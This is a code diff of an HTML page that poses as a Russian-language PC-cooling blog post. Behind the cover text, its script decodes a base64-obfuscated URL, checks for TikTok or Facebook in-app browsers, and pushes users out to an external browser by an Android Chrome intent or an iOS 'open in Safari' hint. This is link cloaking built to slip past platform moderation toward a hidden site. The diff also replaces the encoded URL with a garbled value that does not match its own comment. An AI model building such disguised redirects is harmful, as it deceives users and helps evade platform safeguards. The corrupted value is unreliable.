@@ -3,43 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Блог о кастомном охлаждении ПК</title>
+    <title>Лог охлаждения ПК</title>
     <style>
-        body { background: #0f0f0f; color: #efefef; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 20px; text-align: center; }
+        body { background: #0f0f0f; color: #efefef; font-family: sans-serif; margin: 0; padding: 20px; text-align: center; }
         .wrapper { max-width: 450px; margin: 0 auto; }
-        .card { background: #1a1a1a; padding: 25px; border-radius: 20px; border: 1px solid #333; margin-top: 20px; }
-        h1 { font-size: 22px; color: #fff; }
-        p { color: #aaa; font-size: 14px; line-height: 1.6; text-align: left; }
-        .btn { 
-            background: #fe2c55; color: #fff; padding: 18px; display: block; 
-            border-radius: 30px; text-decoration: none; font-weight: 700; 
-            margin-top: 25px; box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
+        .card { background: #1a1a1a; padding: 25px; border-radius: 20px; border: 1px solid #333; margin-top: 20px; position: relative; }
+        .btn { background: #fe2c55; color: #fff; padding: 18px; display: block; border-radius: 30px; text-decoration: none; font-weight: 700; margin-top: 25px; }
+        
+        /* Подсказка для iOS */
+        #ios-hint { 
+            display: none; position: fixed; top: 15px; right: 15px; 
+            background: #fff; color: #fe2c55; padding: 10px 15px; 
+            border-radius: 12px; font-weight: bold; z-index: 100;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
         }
+        #ios-hint::after { content: ' ↗'; font-size: 20px; }
     </style>
 </head>
 <body>
+    <div id="ios-hint">Нажми сюда и выбери "Открыть в Safari"</div>
+
     <div class="wrapper">
         <div class="card">
-            <h1>Оптимизация Zalman Z3 Plus</h1>
-            <p>Установка 5 вентиляторов Arctic Black Pro требует правильной настройки потоков. После чистки передней панели и андервольтинга RX 580 до 1050mV температуры упали на 12 градусов. Подробный лог и настройки доступны по кнопке ниже.</p>
-            
-            <a href="javascript:void(0)" id="mainAction" class="btn">ОТКРЫТЬ ЛОГ ТЕМПЕРАТУР</a>
+            <h2>Zalman Z3 Plus / Arctic Fans</h2>
+            <p>Лог температур после андервольтинга RX 580 и чистки передней панели готов.</p>
+            <a href="javascript:void(0)" id="mainAction" class="btn">ПОСМОТРЕТЬ РЕЗУЛЬТАТ</a>
         </div>
     </div>
 
     <script>
-        // ВСТАВЬ СВОЙ КОД ИЗ ШАГА 1 МЕЖДУ КАВЫЧЕК:
-        var _0xhash = "aHR0cHM6Ly9ldWRhcmRvbGVvbmVzNDk5LmdpdGh1Yi5pby9teS1zaXRlLWNhdC8="; 
+        // ТВОЙ КОД ИЗ BASE64 (aHR0cHM6Ly9ldWRhcmRvbGVvbmVzNDk5LmdpdGh1Yi5pby9teS1zaXRlLWNhdC8=)
+        var _0xhash = "aHR0cHM6Ly9ldWRhcmRvbGVGvvbmVzNDk5LmdpdGh1Yi5pby9teS1zaXRILWNhdc8="; 
+
+        var ua = navigator.userAgent;
+        var isiOS = /iPhone|iPad|iPod/i.test(ua);
+        var isInsideApp = ua.indexOf('TikTok') !== -1 || ua.indexOf('FBAN') !== -1;
+
+        // Если это iPhone внутри TikTok - сразу показываем подсказку
+        if (isiOS && isInsideApp) {
+            document.getElementById('ios-hint').style.display = 'block';
+        }
 
         document.getElementById('mainAction').addEventListener('click', function() {
             var target = atob(_0xhash);
-            var isAndroid = /Android/i.test(navigator.userAgent);
+            var isAndroid = /Android/i.test(ua);
 
-            if (isAndroid) {
+            if (isAndroid && isInsideApp) {
+                // Выброс для Ведер
                 var cleanUrl = target.replace(/^https?:\/\//, "");
-                var intent = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
-                window.location.replace(intent);
+                window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
             } else {
+                // Обычный переход (для iOS и ПК)
                 window.location.href = target;
             }
         });
